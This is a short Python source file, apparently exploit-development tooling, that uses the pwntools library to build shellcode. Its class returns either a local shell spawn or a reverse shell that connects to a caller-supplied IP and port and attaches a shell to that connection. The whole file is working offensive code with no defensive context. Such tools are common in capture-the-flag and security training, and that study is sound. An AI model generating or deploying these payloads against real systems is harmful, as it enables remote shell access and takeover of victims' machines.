from pwn import *

class ShellcodeGenerator:
    def generate_shellcode(self, shell_type='basic', ip=None, port=None):
        if shell_type == 'basic':
            return asm(shellcraft.sh())
        elif shell_type == 'reverse':
            if not ip or not port:
                raise ValueError("IP and port are required for reverse shell")
            return asm(shellcraft.connect(ip, port) + shellcraft.dupsh('rbp'))
        else:
            raise ValueError("Unsupported shellcode type")